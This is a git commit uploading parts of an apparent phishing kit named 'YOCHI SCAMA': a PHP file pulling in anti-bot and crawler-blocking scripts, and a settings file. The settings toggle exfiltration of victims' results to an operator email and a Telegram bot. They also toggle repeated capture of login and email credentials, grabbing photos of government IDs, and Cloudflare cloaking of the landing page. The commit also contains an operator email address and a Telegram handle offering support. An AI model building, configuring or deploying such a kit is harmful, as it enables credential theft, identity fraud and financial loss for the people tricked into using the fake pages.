7ceece2be6defc4b2cc14a3efa90170ea0ddf3b1
cmdcenter00 <121667712+cmdcenter00@users.noreply.github.com>
2022-12-30 09:56:06 +0000

    Add files via upload

---
+++ btm.php
@@ -0,0 +1,9 @@
+<?php
+error_reporting(0);
+include('Update/autob/bt.php');
+include('Update/autob/basicbot.php');
+include('Update/autob/uacrawler.php');
+include('Update/autob/refspam.php');
+include('Update/autob/ipselect.php');
+include('Update/autob/bts2.php');
+?>
---
+++ settings.php
@@ -0,0 +1,40 @@
+<?php
+#########################################################################################################
+# <------- YOCHI SCAMA CONFIGURATION FILE <></>
+/*
+TOGGLE ON / OFF:
+1 : ENABLE.
+0 : DISABLE.
+USE 1 OR 0 to SET FEATURES ON OR OFF*/
+
+$mobileonly=0;                     # <--- BLOCK ALL DEVICES THAT ARE NOT MOBILE
+$usecaution=1;                     # <--- INDICATE WHETHER YOU WANT TO USE CAUTION OR NOT	
+$cautioncontent='info';            # <--- card / deposit / update /info ..... content for caution page. 
+$createfolderpersession=1;         # <--- CREATE A NEW FOLDER FOR EACH SESSION
+$ftpsave=0;                        # <--- SAVE RESULTS ON SCAMAHOMEFOLDER/rst/.....
+$sendtoemail=1;                    # <--- SEND RESULTS TO EMAIL
+$sendtotg=1;                       # <--- SEND RESULTS TO TELEGRAM
+$doubleloginentry=1;               # <--- REQUEST TWICE FOR LOGIN DETAILS
+$confirmemaillog=1;                # <--- REQUEST TWICE FOR EMAIL ACCESS DETAILS
+$cloudflarelanding=1;              # <--- USE CLOUDFLARE FOR LANDING PAGE
+$grabemail=1;                      # <--- GRAB EMAIL ACCESS
+$grabidphoto=1;                    # <--- GRAB PHOTO OF DL OR ANY OTHER GOV. ID
+$send = "inaam0570@gmail.com";   # <--- YOUR EMAIL/EMAILS SEPARATED BY COMMAS
+$tgbot = " ";         # <--- YOUR TELEGRAM BOT TOKEN WITHOUT "bot" AS PREFIX
+$chatid = " ";               # <--- YOUR TELEGRAM CHAT ID
+$resultheading = "APPROVED";      # <--- WHAT YOUR RESULTS SHOULD DISPLAY AS TOP 
+$adminpanel = 1;                   # <--- ENABLE ADMIN PANEL
+$adminpass = "";                   # <--- YOUR PASSWORD TO VIEW ADMIN PANEL
+// goto yourdomain.com/admin/index.php to track visiting activity
+/*  ___      ___      _______  __
+    \  \    /  /     /  _____||  |
+     \  \  /  /	    /  /      |  |
+      \  \/  /	   |  |	      |  |___    O
+       \    /____  |  |       |   ___ \	 _
+        |  |/_ _ \ |  |       |  |   \ || |
+        |  |    | \  \____  |  |   | || |
+        |__|\____/   \______| |__|   | ||_|      grr
+	Telegram : @yo_ch
+	If you experience any issues or for upgrade
+									   */
+?>
